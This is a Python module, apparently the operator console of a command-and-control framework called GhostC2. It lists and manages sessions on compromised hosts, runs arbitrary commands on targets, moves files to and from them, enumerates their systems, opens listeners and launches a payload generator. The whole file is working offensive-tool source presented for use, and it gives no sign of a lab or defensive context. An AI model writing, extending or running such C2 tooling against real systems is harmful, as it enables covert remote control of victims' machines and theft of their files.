import os
import threading
from utils.logger import Logger
from utils.helpers import get_local_ip
from modules.sysinfo import get_full_sysinfo, print_sysinfo

HELP = """
  Commands:
  ─────────────────────────────────────────────
  sessions              List all active sessions
  use <id>              Interact with a session
  kill <id>             Terminate a session
  cleanup               Remove dead sessions
  generate              Launch payload generator
  listen <port>         Start new listener on port
  listeners             Show active listeners
  help                  Show this help
  exit / quit           Exit GhostC2
  ─────────────────────────────────────────────
"""

SESSION_HELP = """
  Session commands:
  ─────────────────────────────────────────────
  <command>             Execute command on target
  upload <local> [remote]   Upload file to target
  download <remote> [local] Download file from target
  sysinfo               Full system enumeration
  background / bg       Return to C2 console
  exit                  Kill this session
  ─────────────────────────────────────────────
"""


class Console:
    def __init__(self, session_manager, listeners, logger=None):
        self.sm = session_manager
        self.listeners = listeners  # dict of port -> Listener
        self.logger = logger or Logger()

    def run(self):
        """Main C2 console loop."""
        print(HELP)
        while True:
            try:
                cmd = self.logger.c2_prompt().strip()
            except (KeyboardInterrupt, EOFError):
                print()
                self.logger.warning("Use 'exit' to quit")
                continue

            if not cmd:
                continue

            parts = cmd.split()
            command = parts[0].lower()

            if command in ("exit", "quit"):
                self._shutdown()
                break

            elif command == "help":
                print(HELP)

            elif command == "sessions":
                self.sm.print_table()

            elif command == "cleanup":
                removed = self.sm.cleanup()
                self.logger.info(f"Removed {removed} dead session(s)")

            elif command == "use":
                if len(parts) < 2:
                    self.logger.error("Usage: use <session_id>")
                    continue
                session = self.sm.get(parts[1])
                if not session:
                    self.logger.error(f"Session {parts[1]} not found")
                elif not session.alive:
                    self.logger.error(f"Session {parts[1]} is dead")
                else:
                    self._interact_session(session)

            elif command == "kill":
                if len(parts) < 2:
                    self.logger.error("Usage: kill <session_id>")
                    continue
                if self.sm.remove(parts[1]):
                    self.logger.success(f"Session {parts[1]} terminated")
                else:
                    self.logger.error(f"Session {parts[1]} not found")

            elif command == "generate":
                from payloads.generator import generate
                generate(logger=self.logger)

            elif command == "listen":
                if len(parts) < 2:
                    self.logger.error("Usage: listen <port>")
                    continue
                self._start_listener(int(parts[1]))

            elif command == "listeners":
                if not self.listeners:
                    self.logger.warning("No active listeners")
                else:
                    for port, l in self.listeners.items():
                        status = "running" if l.running else "stopped"
                        self.logger.info(f"Port {port} — {status}")

            else:
                self.logger.error(f"Unknown command: {command}. Type 'help'")

    def _interact_session(self, session):
        """Drop into an interactive shell session."""
        self.logger.success(f"Interacting with Session {session.id} ({session.user}@{session.hostname})")
        print(SESSION_HELP)

        while True:
            try:
                cmd = self.logger.prompt(session.id, session.cwd).strip()
            except (KeyboardInterrupt, EOFError):
                print()
                self.logger.warning("Use 'background' to return to console or 'exit' to kill session")
                continue

            if not cmd:
                continue

            parts = cmd.split()
            command = parts[0].lower()

            if command in ("background", "bg"):
                self.logger.info("Backgrounding session...")
                break

            elif command == "exit":
                self.sm.remove(session.id)
                self.logger.warning(f"Session {session.id} killed")
                break

            elif command == "sysinfo":
                info = get_full_sysinfo(session)
                print_sysinfo(info, self.logger)

            elif command == "upload":
                if len(parts) < 2:
                    self.logger.error("Usage: upload <local_path> [remote_path]")
                    continue
                local = parts[1]
                remote = parts[2] if len(parts) > 2 else None
                ok, msg = session.upload(local, remote)
                if ok:
                    self.logger.success(msg)
                else:
                    self.logger.error(msg)

            elif command == "download":
                if len(parts) < 2:
                    self.logger.error("Usage: download <remote_path> [local_path]")
                    continue
                remote = parts[1]
                local = parts[2] if len(parts) > 2 else None
                ok, msg = session.download(remote, local)
                if ok:
                    self.logger.success(msg)
                else:
                    self.logger.error(msg)

            else:
                # Execute command on remote
                if not session.alive:
                    self.logger.error("Session is dead")
                    break
                output = session.execute(cmd)
                if output is None:
                    self.logger.error("Session lost")
                    session.alive = False
                    break
                # Update cwd if cd command
                if command == "cd" and len(parts) > 1:
                    new_cwd = session.execute("pwd", timeout=5)
                    if new_cwd:
                        session.cwd = new_cwd.strip()
                if output:
                    print(output)

    def _start_listener(self, port):
        """Start a new listener on given port."""
        from core.listener import Listener
        if port in self.listeners:
            self.logger.warning(f"Listener already running on port {port}")
            return
        try:
            l = Listener(port=port, session_manager=self.sm, logger=self.logger)
            l.start(background=True)
            self.listeners[port] = l
        except Exception as e:
            self.logger.error(f"Failed to start listener: {e}")

    def _shutdown(self):
        """Gracefully shut down all listeners and sessions."""
        self.logger.warning("Shutting down GhostC2...")
        for l in self.listeners.values():
            l.stop()
        for session in self.sm.all().values():
            session.close()
        self.logger.info("Goodbye 👻")
